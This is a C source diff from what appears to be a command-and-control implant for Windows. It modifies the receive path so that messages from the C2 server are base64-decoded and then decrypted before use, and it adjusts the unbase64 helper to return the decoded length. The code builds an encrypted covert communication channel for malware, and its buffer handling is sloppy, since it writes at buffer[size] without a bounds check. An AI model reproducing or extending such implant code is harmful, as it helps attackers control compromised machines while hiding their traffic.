@@ -31,7 +31,7 @@ int SetupComms();
 void TearDownComms();
 void ResetHTTPHandle();
 char* base64(char* input, int len);
-char* unbase64(char* input, int len);
+char* unbase64(char* buffer, int len, int* outLen);
 char* Encrypt(char* msg, int len, int* pOutLen);
 char* Decrypt(char* ciphertext, int len, int* pOutLen);
 void c2_log(const char* format, ...);
@@ -165,8 +165,9 @@ char* base64(char* bytes, int len) {
 
 // Returns pointer to base64 decoding of bytes.
 // Len is size of buffer
+// outLen is length of decoded result
 // Result needs to be freed eventually.
-char* unbase64(char* buffer, int len) {
+char* unbase64(char* buffer, int len, int* outLen) {
     DWORD size = len;
     char* result;
 
@@ -182,6 +183,7 @@ char* unbase64(char* buffer, int len) {
         c2_log("[!] base64:CryptStringToBinary failed with status %s\n", GetLastError());
         return NULL;
     }
+    *outLen = size;
     return result;
 }
 
@@ -297,6 +299,8 @@ int c2_send_body(char* data, int len) {
 // Len is length of buffer.
 int c2_recv(char* buffer, int len) {
     BOOL result;
+    char* decoded;
+    char* message;
     DWORD numBytesRead;
 
     // Don't reset handle on response, otherwise we cant get the data
@@ -316,12 +320,16 @@ int c2_recv(char* buffer, int len) {
     }
 
     // Base64 decode data (performed in place)
-    char* decoded = unbase64(buffer, numBytesRead);
-    strncpy(buffer, decoded, numBytesRead);
-    buffer[numBytesRead - 1] = '\0';
+    int size;
+    decoded = unbase64(buffer, numBytesRead, &size);
+    message = Decrypt(decoded, size, &size);
+    strncpy(buffer, message, size);
+    buffer[size] = '\0'; // for some reason size-1 leaves off the last byte
+    
     Free(decoded);
+    Free(message);
 
-    return numBytesRead;
+    return size;
 }
 
 
